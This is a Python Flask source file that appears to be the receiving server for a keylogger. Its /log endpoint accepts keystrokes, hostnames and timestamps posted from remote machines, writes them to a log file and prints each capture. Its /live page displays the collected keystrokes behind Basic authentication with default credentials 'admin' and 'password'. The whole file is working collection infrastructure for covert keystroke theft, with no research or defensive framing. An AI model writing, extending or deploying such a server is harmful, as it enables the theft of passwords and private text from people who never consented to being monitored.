from flask import Flask, request, jsonify, Response
from threading import Lock
import logging
import os
import base64

app = Flask(__name__)
log_lock = Lock()
KEYLOG_FILE = "/tmp/keystrokes.log"

# Use environment variables for credentials
USERNAME = os.environ.get("ADMIN_USERNAME", "admin")
PASSWORD = os.environ.get("ADMIN_PASSWORD", "password")

def check_auth(auth_header: str) -> bool:
    if not auth_header or not auth_header.startswith("Basic "):
        return False
    try:
        encoded_credentials = auth_header.split(" ")[1]
        decoded = base64.b64decode(encoded_credentials).decode("utf-8")
        input_user, input_pass = decoded.split(":", 1)
        return input_user == USERNAME and input_pass == PASSWORD
    except Exception as e:
        logging.error(f"Auth decoding error: {e}")
        return False

@app.route('/log', methods=['POST'])
def handle_keylog():
    with log_lock:
        try:
            data = request.json
            with open(KEYLOG_FILE, "a") as f:
                f.write(f"[{data['timestamp']}] {data['hostname']}: {data['keystrokes']}\n")
            print(f"\033[92mNEW KEYLOG\033[0m | {data['hostname']} | {data['keystrokes']}")
            return jsonify({"status": "success"}), 200
        except Exception as e:
            logging.error(f"Error: {str(e)}")
            return jsonify({"status": "error"}), 500

@app.route('/live', methods=['GET'])
def live_view():
    auth = request.headers.get("Authorization")
    if not check_auth(auth):
        return Response(
            "Could not verify your access.\n",
            401,
            {"WWW-Authenticate": 'Basic realm="Login Required"'}
        )

    if not os.path.exists(KEYLOG_FILE):
        return "<pre>No logs yet.</pre>", 200

    with open(KEYLOG_FILE, "r") as f:
        return f"<pre>{f.read()}</pre>", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
